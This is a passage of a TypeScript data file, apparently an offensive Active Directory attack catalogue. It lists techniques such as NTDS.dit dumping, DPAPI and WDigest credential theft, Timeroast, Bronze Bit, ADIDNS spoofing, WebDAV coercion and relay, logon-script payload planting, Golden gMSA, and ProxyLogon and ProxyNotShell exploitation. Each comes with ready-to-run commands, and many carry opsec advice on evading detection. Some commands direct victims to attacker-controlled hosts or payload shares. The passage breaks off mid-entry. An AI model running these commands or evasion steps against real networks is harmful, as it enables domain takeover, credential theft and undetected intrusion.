import type { AttackEdge, TechniqueNodeDef } from '../schema';
import { mitre, r } from '../lib';

/**
 * Coverage gaps found auditing against The Hacker Recipes' AD taxonomy
 * (recon + all movement subsections + persistence). Web-verified; wired into
 * the existing category folders.
 */
export const adCoverageNodes: TechniqueNodeDef[] = [
  {
    id: 'ntds-dump',
    label: 'NTDS.dit Extraction (VSS / ntdsutil)',
    phase: 'credential-access',
    needs: 'domain-admin',
    summary: "Copy the DC's locked AD database via Shadow Copy / ntdsutil IFM, parse offline.",
    description:
      "With admin access to a Domain Controller, the locked NTDS.dit database can be copied by snapshotting the volume (vssadmin/diskshadow) or via ntdsutil's IFM export. With the SYSTEM hive it yields NT hashes, Kerberos keys (incl. krbtgt) and password history for every account: the on-DC alternative to DCSync, and how a stolen DC backup/VM is looted.",
    tools: [
      { name: 'secretsdump (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'ntdsutil', url: 'https://ss64.com/nt/ntdsutil.html' },
      { name: 'DSInternals', url: 'https://github.com/MichaelGrafnetter/DSInternals' },
      { name: 'NetExec (--ntds)', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'ntdsutil IFM export on the DC', code: r`ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\ntds" quit quit`, lang: 'cmd' },
      { label: 'Parse offline with secretsdump', code: r`secretsdump.py -ntds ntds.dit -system system.save LOCAL`, lang: 'bash' },
      { label: 'Remote dump using the DC VSS', code: r`secretsdump.py -use-vss 'DOMAIN/Administrator:Pass@dc01.corp.local'`, lang: 'bash' },
      { label: 'Dump NTDS via the DC VSS snapshot (NetExec)', code: r`nxc smb <dc> -u user -p pass --ntds vss`, lang: 'bash' },
    ],
    mitre: mitre('T1003.003'),
    references: [
      { label: 'HackTricks, DCSync (NTDS secrets)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/dcsync.html' },{ label: 'The Hacker Recipes, NTDS secrets', url: 'https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds' },{ label: 'Microsoft, ntdsutil ifm (create full)', url: 'https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732530(v=ws.11)' }],
    requires: ['Administrative access to a Domain Controller (or a stolen DC backup/VM)'],
    opsec: 'Shadow-copy creation and ntdsutil snapshots are logged (4688 / VSS events) and noisy; defenders monitor secretsdump/ntdsutil patterns. The remote replication method (DRSUAPI, the nxc --ntds default) spawns no suspicious process on the DC, so it is caught instead via Event 4662 (the DS-Replication-Get-Changes GUIDs requested by a non-DC principal), distinct from the 4688-based detection of the on-box snapshot tools. Pull only the needed hives and clean up snapshots.',
  },
  {
    id: 'dpapi-user-secrets',
    label: 'DPAPI User Secrets',
    phase: 'credential-access',
    needs: 'local-admin',
    summary: 'Decrypt per-user DPAPI master keys → browser, Credential Manager, RDP, vault secrets.',
    description:
      "DPAPI encrypts user secrets (Chrome/Edge logins, Credential Manager, saved RDP creds) under master keys derived from the user's password/NT hash. Given the password/hash, SYSTEM on the host, or the domain DPAPI backup key, these master keys decrypt offline and the blobs are recovered. Scheduled-task and service-account passwords are protected under the MACHINE master keys instead (decrypted from the SYSTEM DPAPI_SYSTEM secret, not the user's password). This is the user-level harvesting layer, distinct from the domain backup key.",
    tools: [
      { name: 'SharpDPAPI', url: 'https://github.com/GhostPack/SharpDPAPI' },
      { name: 'DonPAPI', url: 'https://github.com/login-securite/DonPAPI' },
      { name: 'dpapi.py (Impacket)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      { label: 'Mass-harvest remotely (DonPAPI)', code: r`donpapi collect -u user -p 'Password1' -d corp.local --target 10.0.0.0/24`, lang: 'bash' },
      { label: 'Decrypt a masterkey with the user password', code: r`dpapi.py masterkey -file ./masterkeyfile -sid <SID> -password 'Password1'`, lang: 'bash' },
      { label: 'Triage + decrypt creds/vaults (SharpDPAPI)', code: r`SharpDPAPI.exe triage /password:Password1`, lang: 'cmd' },
    ],
    mitre: mitre('T1555'),
    references: [
      { label: 'HackTricks, DPAPI: Extracting Passwords', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html' },{ label: 'The Hacker Recipes, DPAPI secrets', url: 'https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets' },{ label: 'harmj0y, Operational Guidance for Offensive User DPAPI Abuse', url: 'https://blog.harmj0y.net/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/' }],
    requires: ["SYSTEM on the user's host, or the user's password/hash, or the domain DPAPI backup key"],
    opsec: "Reading other users' masterkey/credential files and touching LSASS for the master-key cache can trigger EDR; remote DonPAPI collection generates SMB access to profile paths across many hosts.",
  },
  {
    id: 'wdigest-downgrade',
    label: 'WDigest Cleartext Downgrade',
    phase: 'credential-access',
    needs: 'local-admin',
    summary: 'Re-enable WDigest plaintext caching, then read passwords from LSASS after a logon.',
    description: r`Since Windows 8.1 / Server 2012 R2, WDigest no longer caches plaintext credentials in LSASS by default. An admin can set HKLM\...\WDigest\UseLogonCredential to 1 to force cleartext caching again, then wait for interactive/RDP logons and dump LSASS to read passwords directly, avoiding offline cracking. Slow, and best on jump hosts with frequent privileged logons. Condition: this only works where Credential Guard is off. On Windows 11 / Server 2022+ Credential Guard is increasingly enabled by default and isolates secrets in VSM (LSAIso), so UseLogonCredential has no effect on cleartext. You would first have to disable or bypass Credential Guard: the supported config/GPO disable is reboot-gated and high-signal, whereas the offensive in-memory bypass (itm4n / BypassCredGuard) patches the wdigest globals in live LSASS at runtime with SYSTEM and no reboot.`,
    tools: [
      { name: 'mimikatz (sekurlsa::wdigest)', url: 'https://github.com/gentilkiwi/mimikatz' },
    ],
    commands: [
      { label: 'Enable cleartext caching', code: r`reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f`, lang: 'cmd' },
      { label: 'After a logon, read cleartext from LSASS', code: r`sekurlsa::wdigest`, lang: 'text' },
    ],
    mitre: mitre('T1003.001'),
    references: [
      { label: 'HackTricks, Stealing Credentials', url: 'https://book.hacktricks.wiki/en/windows-hardening/stealing-credentials/index.html' },{ label: 'Microsoft, KB2871997 and WDigest (UseLogonCredential)', url: 'https://learn.microsoft.com/en-us/archive/blogs/kfalde/kb2871997-and-wdigest-part-1' }],
    requires: ['Local admin / SYSTEM on the host', 'Credential Guard NOT enabled (or already bypassed)', 'A victim interactive/RDP logon after the change'],
    opsec: 'Writing UseLogonCredential=1 is a high-signal indicator monitored by EDR and Sysmon registry rules; it also requires waiting for a victim logon, increasing dwell time.',
  },
  {
    id: 'timeroast',
    label: 'Timeroast',
    phase: 'credential-access',
    needs: 'none',
    summary: 'Abuse MS-SNTP to extract crackable computer/trust account hashes from a DC, no auth needed.',
    description:
      "Domain Controllers authenticate NTP responses (MS-SNTP) with a MAC keyed on the queried account's NT hash, indexed by RID. An unauthenticated attacker iterates RIDs against the DC's UDP/123 service to obtain password-equivalent hashes for all computer/trust accounts, then cracks them offline (hashcat -m 31300). Effective against weak/predictable machine passwords.",
    tools: [
      { name: 'Timeroast (SecuraBV)', url: 'https://github.com/SecuraBV/Timeroast' },
      { name: 'NetExec (timeroast module)', url: 'https://github.com/Pennyw0rth/NetExec' },
      { name: 'hashcat', url: 'https://hashcat.net/hashcat/' },
    ],
    commands: [
      { label: 'Unauthenticated harvest', code: r`python3 timeroast.py 10.0.0.1 -o timeroast_hashes.txt`, lang: 'bash' },
      { label: 'Crack the MACs (mode 31300; --username strips the RID prefix)', code: r`hashcat -m 31300 --username timeroast_hashes.txt wordlist.txt`, lang: 'bash' },
    ],
    mitre: mitre('T1110.002'),
    references: [
      {
        label: 'Secura whitepaper, Timeroasting, Trustroasting & Computer Spraying (Tom Tervoort, original research)',
        url: 'https://cybersecurity.bureauveritas.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf',
      },
      { label: 'SecuraBV/Timeroast (Tom Tervoort, original tool & paper)', url: 'https://github.com/SecuraBV/Timeroast' },
    ],
    requires: ['Network access to a Domain Controller (UDP/123); no credentials needed'],
    opsec: 'NTP traffic to a DC is ubiquitous and rarely audited, but a full RID sweep is not ordinary time sync: it is a burst of thousands of MS-SNTP client-mode requests from a single non-DC host (up to 180 queries/sec by default) with incrementing RIDs, which is detectable where MS-SNTP request patterns are monitored. Throttle -a and/or target known RIDs to stay under the radar. Cracking is compute-intensive but runs entirely offline on attacker hardware, so it is invisible to the target.',
  },
  {
    id: 'unpac-the-hash',
    label: 'UnPAC-the-Hash',
    phase: 'credential-access',
    needs: 'domain-user',
    summary: "Recover an account's NT hash from a PKINIT (certificate) TGT via a U2U request.",
    description:
      "When PKINIT yields a TGT (from an AD CS cert or Shadow Credentials), the KDC embeds the account's NT hash in the PAC's PAC_CREDENTIAL_INFO so NTLM still works. A U2U S4U2self request with that TGT decrypts the buffer and recovers the NT hash, bridging certificate access to hash attacks (PtH, silver tickets) without the password.",
    tools: [
      { name: 'Certipy (auth)', url: 'https://github.com/ly4k/Certipy' },
      { name: 'PKINITtools', url: 'https://github.com/dirkjanm/PKINITtools' },
    ],
    commands: [
      { label: 'Cert → TGT → NT hash (Certipy)', code: r`certipy auth -pfx user.pfx -dc-ip 10.0.0.1`, lang: 'bash' },
      { label: 'Manual (PKINITtools)', code: r`gettgtpkinit.py corp.local/user -cert-pfx user.pfx out.ccache
export KRB5CCNAME=out.ccache
getnthash.py corp.local/user -key <AS-REP-key>`, lang: 'bash' },
    ],
    mitre: mitre('T1550.002'),
    references: [
      { label: 'HackTricks, AD CS Account Persistence', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/account-persistence.html' },{ label: 'The Hacker Recipes, UnPAC the hash', url: 'https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash' },{ label: 'dirkjanm, PKINITtools (getnthash.py)', url: 'https://github.com/dirkjanm/PKINITtools' },{ label: 'dirkjanm, NTLM relaying to AD CS (getnthash / NT hash from PKINIT, original research)', url: 'https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/' }],
    requires: ['A PKINIT-capable certificate or key credential for the target (from AD CS / Shadow Credentials)'],
    opsec: 'The U2U + S4U2self self-ticket TGS-REQ (ENC-TKT-IN-SKEY, kdc-options ~0x40810018) is a distinctive on-wire pattern that vendors hunt for, so the recovery step does not simply blend in; the upstream certificate enrollment is also detectable. Operationally: PKINIT and the U2U request both fail on clock skew, so sync the host clock to the DC first (KRB_AP_ERR_SKEW) and point KRB5CCNAME at the emitted ccache before running getnthash.',
  },
  {
    id: 'bronze-bit',
    label: 'Bronze Bit (CVE-2020-17049)',
    phase: 'lateral-movement',
    needs: 'domain-user',
    summary: 'Forge the forwardable flag on S4U2self tickets to bypass delegation restrictions.',
    description:
      "CVE-2020-17049 lets an attacker who controls a delegation-configured account tamper with the encrypted S4U2self ticket to set the forwardable bit, even without TrustedToAuthForDelegation, or when the target is 'sensitive and cannot be delegated' / in Protected Users. This widens constrained-delegation abuse to impersonate otherwise-protected privileged users.",
    tools: [{ name: 'getST (Impacket)', url: 'https://github.com/fortra/impacket' }],
    commands: [
      { label: 'Forge a forwardable S4U ticket', code: r`getST.py -spn cifs/target.corp.local -impersonate Administrator -force-forwardable corp.local/svc$ -hashes :<NT-hash>`, lang: 'bash' },
    ],
    mitre: mitre('T1558'),
    references: [
      {
        label: 'NetSPI, Kerberos Bronze Bit Attack, CVE-2020-17049 (Jake Karnes, original research)',
        url: 'https://www.netspi.com/blog/technical-blog/network-pentesting/cve-2020-17049-kerberos-bronze-bit-overview/',
      },
      { label: 'The Hacker Recipes, Bronze Bit', url: 'https://www.thehacker.recipes/ad/movement/kerberos/delegations/bronze-bit' },
    ],
    requires: ["Control of a delegation-configured account's key/hash", 'An unpatched KDC (pre Nov-2020)'],
    opsec: 'Requires the delegation account key. Only the bit-flip is offline; the attack still performs live S4U2self and S4U2proxy exchanges against the KDC (4769 events on the DC). The tampered ticket is undetectable in its contents (no signature protects the forwardable flag), but those S4U round-trips are ordinary logged KDC traffic. Patched on updated DCs, so success implies an unpatched KDC.',
  },
  {
    id: 'arp-poisoning',
    label: 'ARP Poisoning',
    phase: 'initial-access',
    needs: 'none',
    summary: 'Spoof ARP to become a man-in-the-middle on the local network for capture and relay.',
    description:
      'ARP has no authentication, so unsolicited replies are trusted. Poisoning the victim and/or gateway ARP caches reroutes traffic through the attacker, who can sniff cleartext protocols, capture NetNTLM challenge-responses, and feed redirected authentications into relay chains. A noisy fallback when LLMNR/NBNS poisoning is unavailable.',
    tools: [
      { name: 'bettercap', url: 'https://www.bettercap.org/' },
      { name: 'dsniff (arpspoof)', url: 'https://www.monkey.org/~dugsong/dsniff/' },
    ],
    commands: [
      { label: 'Targeted ARP MITM (bettercap; fullduplex also poisons the gateway for two-way interception, default is half-duplex/target-only)', code: r`bettercap -iface eth0 -eval "set arp.spoof.targets 10.0.0.50; set arp.spoof.fullduplex true; arp.spoof on; net.sniff on"`, lang: 'bash' },
    ],
    mitre: mitre('T1557.002'),
    references: [{ label: 'The Hacker Recipes, ARP poisoning', url: 'https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/arp-poisoning' }],
    requires: ['On the same local network as the target'],
    opsec: 'Loud and risky. It floods the segment and can break connectivity. NIDS and monitoring detect it; Dynamic ARP Inspection (plus port security / static ARP) actively drops the spoofed replies, so the attack fails outright on a segment with DAI configured. Poison specific hosts, never the whole subnet. bettercap enables IP forwarding automatically; the manual sysctl -w net.ipv4.ip_forward=1 step is only needed for the dsniff/arpspoof path.',
  },
  {
    id: 'adidns-spoofing',
    label: 'ADIDNS Spoofing',
    phase: 'credential-access',
    needs: 'domain-user',
    summary: 'As any user, add a DNS record (or wildcard) to MITM name resolution domain-wide.',
    description:
      "AD-Integrated DNS zones grant Authenticated Users the right to create child records by default. An attacker adds records pointing at themselves (or a wildcard '*' that answers all unresolved names EXCEPT the DNS Global Query Block List entries, which by default include wpad and isatap), turning one LDAP write into domain-wide LLMNR-style poisoning that survives reboots. For the WPAD chain specifically: on DCs patched against CVE-2018-8320 (Oct 2018) a wildcard/DNAME no longer bypasses the GQBL, so you need an NS record (which still bypasses it) or the defender must have removed wpad from the GQBL.",
    tools: [
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
      { name: 'krbrelayx (dnstool.py)', url: 'https://github.com/dirkjanm/krbrelayx' },
      { name: 'Powermad', url: 'https://github.com/Kevin-Robertson/Powermad' },
    ],
    commands: [
      { label: 'bloodyAD', code: 'bloodyAD -u user -p pass -d domain.local --host dc01 add dnsRecord <name> <attacker_ip>', lang: 'bash' },
      { label: 'Inject a wildcard record', code: r`dnstool.py -u 'CORP\user' -p 'Password1' --record '*' --action add --data 10.0.0.66 10.0.0.1`, lang: 'bash' },
      { label: 'Add an attacker A-record', code: r`dnstool.py -u 'CORP\user' -p 'Password1' --record 'fileserver' --action add --data 10.0.0.66 10.0.0.1`, lang: 'bash' },
    ],
    mitre: mitre('T1557'),
    references: [
      { label: 'HackTricks, AD DNS Records', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-dns-records.html' },{ label: 'The Hacker Recipes, ADIDNS spoofing', url: 'https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing' },{ label: 'NetSPI, Beyond LLMNR/NBNS Spoofing: Exploiting ADIDNS (Kevin Robertson, original research)', url: 'https://www.netspi.com/blog/technical-blog/network-pentesting/exploiting-adidns/' },{ label: 'NetSPI, ADIDNS Revisited: WPAD, GQBL, and More (Kevin Robertson)', url: 'https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/' }],
    requires: ['Any authenticated domain account', 'AD-integrated DNS zone with default create-child rights'],
    opsec: 'Writes a persistent object visible in DNS Manager and LDAP; a domain-wide wildcard is disruptive and conspicuous. Clean up records and prefer targeted entries.',
  },
  {
    id: 'webclient-coercion',
    label: 'WebClient (WebDAV) Coercion',
    phase: 'credential-access',
    needs: 'domain-user',
    summary: 'Coerce a WebClient host over HTTP → relay cross-protocol to LDAP / AD CS (ESC8).',
    description:
      'If the WebClient (WebDAV) service runs on a target (or is triggered by planting a .searchConnector-ms/.library-ms file on a share a user will browse, since WebClient is a manual-start service that fires when a user opens the containing folder in Explorer), coercion methods like PetitPotam/PrinterBug can be pointed at an attacker WebDAV listener using the SERVER@PORT/path syntax. The resulting auth travels over HTTP (not protected by SMB signing), so it relays cross-protocol to LDAP (RBCD/shadow creds) or AD CS web enrollment (ESC8).',
    tools: [
      { name: 'WebclientServiceScanner', url: 'https://github.com/Hackndo/WebclientServiceScanner' },
      { name: 'PetitPotam', url: 'https://github.com/topotam/PetitPotam' },
      { name: 'ntlmrelayx (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'NetExec (webdav)', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Find hosts with WebClient running', code: r`webclientservicescanner corp.local/user:'Password1'@10.0.0.0/24`, lang: 'bash' },
      { label: "Coerce over WebDAV to the relay listener (the listener MUST be a resolvable NetBIOS/hostname, not an IP; use a coerced DNS/ADIDNS record if needed)", code: r`PetitPotam.py -u user -p 'Password1' -d corp.local 'attacker@80/x' victim.corp.local`, lang: 'bash' },
      { label: 'Relay to AD CS web enrollment (ESC8)', code: r`ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template Machine`, lang: 'bash' },
      { label: 'Find hosts running the WebClient service (NetExec)', code: r`nxc smb <subnet> -u user -p pass -M webdav`, lang: 'bash' },
    ],
    mitre: mitre('T1187'),
    references: [{ label: 'The Hacker Recipes, WebClient (WebDAV)', url: 'https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient' }],
    requires: ['The WebClient service running on the target', 'A coercion vector (PetitPotam/PrinterBug)'],
    opsec: 'WebClient is default-off on servers but often on workstations. Starting it remotely and the coercion RPC calls are detectable; ESC8/relay chains are high-impact and monitored.',
  },
  {
    id: 'machineaccountquota-abuse',
    label: 'MachineAccountQuota Abuse',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Default MAQ=10 lets any user create the computer account RBCD / Shadow Creds / noPac need.',
    description:
      "By default any authenticated user can create up to 10 computer accounts (cumulative per creator, tracked via mS-DS-CreatorSID, so deleting accounts does not necessarily free quota) via ms-DS-MachineAccountQuota = 10. Note MAQ > 0 is necessary but not sufficient: the 'Add workstations to domain' user right (SeMachineAccountPrivilege) separately gates creation and can be revoked in Group Policy even when MAQ is non-zero. An attacker creates a fully-controlled machine account to use as the attacker-owned principal required by several primitives: the delegate in RBCD, the principal in Shadow Credentials, and the account in the noPac / sAMAccountName-spoofing chain.",
    tools: [
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
      { name: 'addcomputer (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'Powermad', url: 'https://github.com/Kevin-Robertson/Powermad' },
    ],
    commands: [
      { label: 'bloodyAD', code: 'bloodyAD -u user -p pass -d domain.local --host dc01 add computer <NEWPC> <ComputerPass123!>', lang: 'bash' },
      { label: 'Check MAQ', code: r`netexec ldap 10.0.0.1 -u user -p 'Password1' -M maq`, lang: 'bash' },
      { label: 'Create a computer account', code: r`addcomputer.py -computer-name 'EVIL$' -computer-pass 'Pwn1234!' -dc-host dc01.corp.local corp.local/user:'Password1'`, lang: 'bash' },
    ],
    mitre: mitre('T1136.002'),
    references: [{ label: 'The Hacker Recipes, MachineAccountQuota', url: 'https://www.thehacker.recipes/ad/movement/builtins/machineaccountquota' }],
    requires: ['Any authenticated domain account', 'ms-DS-MachineAccountQuota > 0 (default 10)'],
    opsec: 'Computer-account creation raises event 4741 and leaves a new object in AD; some environments set MAQ=0. The follow-on RBCD/shadow-cred LDAP writes are the higher-signal actions.',
  },
  {
    id: 'logon-script-abuse',
    label: 'Logon Script DACL Abuse',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Write scriptPath / msTSInitialProgram on a user → code exec as them at next logon.',
    description:
      "GenericAll/GenericWrite over a user lets an attacker populate scriptPath (classic logon script) or msTSInitialProgram with a UNC path to a payload. scriptPath runs at any interactive/network domain logon. msTSInitialProgram is a Terminal Services attribute: it fires only when the victim starts an RDS/RDP session on a Terminal Server (and needs msTSWorkDirectory set), so it is unreliable and rarely practical, never triggering against a target who does not RDP to an RDS host. Useful against high-value accounts when a realistic trigger exists.",
    tools: [
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
      { name: 'PowerView', url: 'https://github.com/PowerShellMafia/PowerSploit' },
    ],
    commands: [
      { label: 'Set scriptPath via bloodyAD', code: r`bloodyAD --host dc01.corp.local -d corp.local -u user -p 'Password1' set object victimuser scriptPath -v '\\10.0.0.66\share\run.exe'`, lang: 'bash' },
      { label: 'Set scriptPath via PowerView', code: r`Set-DomainObject -Identity victimuser -Set @{'scriptpath'='\\10.0.0.66\share\run.exe'}`, lang: 'powershell' },
    ],
    mitre: mitre('T1037.003'),
    references: [{ label: 'The Hacker Recipes, Logon script', url: 'https://www.thehacker.recipes/ad/movement/dacl/logon-script' }],
    requires: ['GenericAll/GenericWrite over the target user', 'The victim logs on after the change'],
    opsec: 'Relies on the victim actually logging on (slow/uncertain) and the payload share being reachable; modifying scriptPath is visible in AD. Lower-noise ACL paths (targeted Kerberoast, shadow creds) are usually preferred.',
  },
  {
    id: 'goldengmsa',
    label: 'Golden gMSA',
    phase: 'persistence',
    needs: 'domain-admin',
    summary: 'Steal the KDS root key to compute any gMSA password offline, forever.',
    description:
      "gMSA passwords are derived deterministically from the (rarely-rotated) KDS root key plus the account SID and a password ID. With forest-root DA / SYSTEM on a DC, read the KDS root key once, then compute the current managed password of any gMSA offline at any time (even after resets) and derive its NT hash for pass-the-hash. Persistence lasts until the KDS root key changes.",
    tools: [
      { name: 'GoldenGMSA', url: 'https://github.com/Semperis/GoldenGMSA' },
      { name: 'gMSADumper (authorized-read alternative, not Golden gMSA: reads msDS-ManagedPassword you are allowed to read, no KDS-root-key compute)', url: 'https://github.com/micahvandeusen/gMSADumper' },
    ],
    commands: [
      { label: 'Dump the KDS root key (high priv)', code: r`GoldenGMSA.exe kdsinfo`, lang: 'cmd' },
      { label: 'Compute a gMSA password offline', code: r`GoldenGMSA.exe compute --sid <gmsa-SID> --kdskey <base64> --pwdid <base64>`, lang: 'cmd' },
    ],
    mitre: mitre('T1555'),
    references: [
      {
        label: 'Semperis, Introducing the Golden GMSA Attack (Yuval Gordon, original research)',
        url: 'https://www.semperis.com/blog/golden-gmsa-attack/',
      },
      { label: 'The Hacker Recipes, GoldenGMSA', url: 'https://www.thehacker.recipes/ad/persistence/goldengmsa' },
    ],
    requires: ['Forest-root Domain Admin / SYSTEM on a forest-root DC to read the KDS root key (once); a child-domain DA cannot read it by default'],
    opsec: 'Reading the KDS root key needs high privilege once; afterwards all password computation is offline and undetectable. Rotating the KDS root key (rare/operationally hard) is the only real remediation.',
    affects: 'Domains using gMSAs (KDS root key + Group Managed Service Accounts, introduced in Server 2012).',
    versions: ['srv2012', 'srv2016', 'srv2019', 'srv2022', 'srv2025'],
  },
  {
    id: 'proxylogon',
    label: 'ProxyLogon (CVE-2021-26855/-27065)',
    phase: 'initial-access',
    needs: 'none',
    summary: 'Pre-auth Exchange SSRF + file-write → webshell, SYSTEM RCE on on-prem Exchange.',
    description:
      'CVE-2021-26855 is a pre-authentication SSRF letting an attacker authenticate as the Exchange backend, chained with CVE-2021-27065 to write an arbitrary .aspx webshell. The result is unauthenticated RCE as SYSTEM on on-prem Exchange 2013/2016/2019 (pre Mar-2021), typically a fast pivot to Domain Admin given Exchange\'s elevated AD rights: from SYSTEM the Exchange machine account can abuse Exchange Windows Permissions\' WriteDacl on the domain (pre-Feb-2019 hardening) to grant itself DCSync, or you dump domain credentials on the host.',
    tools: [
      { name: 'ProxyLogon PoC', url: 'https://github.com/p0wershe11/ProxyLogon' },
      { name: 'Metasploit', url: 'https://www.rapid7.com/db/modules/exploit/windows/http/exchange_proxylogon_rce/' },
    ],
    commands: [
      { label: 'Exploit (PoC; --mail must be a real existing mailbox on the target)', code: r`python3 ProxyLogon.py --host=<exchange-fqdn> --mail=<valid-existing-user@target-domain>`, lang: 'bash' },
    ],
    mitre: mitre('T1190'),
    references: [
      { label: 'proxylogon.com, DEVCORE (Orange Tsai), original disclosure', url: 'https://proxylogon.com/' },
    ],
    requires: ['Network access to an unpatched on-prem Exchange (pre Mar-2021)'],
    opsec: 'Webshell drops to known OWA/ECP paths are heavily signatured and widely IOC\'d. Only viable against unpatched/internet-exposed Exchange.',
  },
  {
    id: 'proxynotshell',
    label: 'ProxyNotShell (CVE-2022-41040/-41082)',
    phase: 'initial-access',
    needs: 'domain-user',
    summary: 'Authenticated Exchange SSRF + PowerShell-backend RCE on on-prem Exchange.',
    description:
      'ProxyNotShell pairs an authenticated SSRF (CVE-2022-41040) with a deserialization RCE in the Exchange PowerShell backend (CVE-2022-41082). Unlike ProxyLogon it needs valid credentials for any standard mailbox user, but still yields code execution and an AD foothold. The CVEs affect Exchange 2013/2016/2019, but the Metasploit module below only supports Exchange 2019 (v15.2) and hard-fails on 2013/2016, so use a version-agnostic PoC for the older builds.',
    tools: [
      { name: 'Metasploit', url: 'https://www.rapid7.com/db/modules/exploit/windows/http/exchange_proxynotshell_rce/' },
    ],
    commands: [
      { label: 'Metasploit', code: r`use exploit/windows/http/exchange_proxynotshell_rce
set RHOSTS exchange.corp.local
set USERNAME user@corp.local
set PASSWORD Password1
run`, lang: 'bash' },
    ],
    mitre: mitre('T1190'),
    references: [{ label: 'Unit 42, ProxyNotShell', url: 'https://unit42.paloaltonetworks.com/proxynotshell-cve-2022-41040-cve-2022-41082/' },{ label: 'Microsoft, CVE-2022-41040 advisory (MSRC)', url: 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-41040' },{ label: 'Microsoft, CVE-2022-41082 advisory (MSRC)', url: 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-41082' }],
    requires: ['A standard mailbox account', 'Unpatched Exchange (pre Nov-2022)'],
    opsec: "Requires authentication. Microsoft's URL-rewrite mitigation was repeatedly bypassed (Jang's rule bypass, then the CVE-2022-41080 / OWA front-end path), so it was not a reliable control; only the Nov 2022 patch actually closed the chain. The chain is heavily detected.",
  },
  {
    id: 'local-cred-hunt',
    label: 'Local Credential Hunting',
    phase: 'credential-access',
    needs: 'shell',
    summary:
      "Sweep a host's files, registry and history for plaintext secrets: PS history, autologon, Credential Manager, unattend, WiFi, sticky notes.",
    description:
      "Once you can read a host, an operator sweep turns up cleartext or trivially-recoverable secrets the protected stores miss: PowerShell history (ConsoleHost_history.txt), Windows Credential Manager / Vault (cmdkey, vaultcmd), Winlogon autologon (DefaultPassword), unattend.xml / sysprep, IIS web.config & app-pool identities, scheduled-task XML, WiFi PSKs, Sticky Notes and the Notepad tab cache. Triage tools automate the whole hunt.",
    tools: [
      { name: 'Seatbelt', url: 'https://github.com/GhostPack/Seatbelt' },
      { name: 'LaZagne', url: 'https://github.com/AlessandroZ/LaZagne' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      {
        label: 'Credential Manager (enumerate only) + autologon',
        code: r`cmdkey /list
vaultcmd /listcreds:"Windows Credentials" /all   # lists metadata only, no plaintext
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword`,
        lang: 'cmd',
      },
      {
        label: 'Recover the Credential Manager plaintext (DPAPI tooling)',
        code: r`mimikatz # vault::cred /patch
# or: SharpDPAPI.exe credentials  |  laZagne.exe windows`,
        lang: 'cmd',
      },
      {
        label: 'PowerShell history + WiFi keys',
        code: r`type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
netsh wlan show profile name="<SSID>" key=clear`,
        lang: 'cmd',
      },
      {
        label: 'IIS app-pool service creds (cleartext)',
        code: r`%windir%\system32\inetsrv\appcmd.exe list apppool /text:*`,
        lang: 'cmd',
      },
      {
        label: 'Passwords on the command line in event logs (4688)',
        code: r`nxc smb <host> -u <u> -p <p> -M eventlog_creds`,
        lang: 'bash',
      },
      {
        label: 'Automated triage (note: gpp_autologin reads the DC SYSVOL, not this host)',
        code: r`Seatbelt.exe -group=all
nxc smb <host> -u <u> -p <p> -M powershell_history
nxc smb <dc> -u <u> -p <p> -M gpp_autologin   # domain-wide GPP hunt on SYSVOL, not local triage`,
        lang: 'bash',
      },
    ],
    mitre: mitre('T1552'),
    references: [
      { label: 'GhostPack, Seatbelt', url: 'https://github.com/GhostPack/Seatbelt' },
      { label: 'LaZagne', url: 'https://github.com/AlessandroZ/LaZagne' },
    ],
    requires: ['Read access to a host (local user; local admin for protected paths)'],
    opsec:
      'Purely local file/registry reads stay quiet. Louder are the remote nxc modules (eventlog_creds, powershell_history), which authenticate over SMB and touch the remote host (4624 / admin-share access, and eventlog_creds reads the monitored Security log), and vaultcmd /cmdkey, which have purpose-built credential-enumeration detections. The loudest is running a known triage binary (Seatbelt/LaZagne), which is heavily AV-signatured; prefer manual/targeted reads on monitored hosts.',
  },
  {
    id: 'browser-creds',
    label: 'Browser Credentials & Cookies',
    phase: 'credential-access',
    needs: 'local-admin',
    summary:
      'Decrypt saved browser logins and steal session cookies; replay cookies to bypass MFA.',
    description:
      'Chromium/Edge store logins and cookies under DPAPI (and, on Chrome v127+, App-Bound Encryption); Firefox uses its own NSS key store. Beyond passwords, stealing live session cookies/tokens lets you replay an already-authenticated session (bypassing MFA) into M365, SSO and cloud apps.',
    tools: [
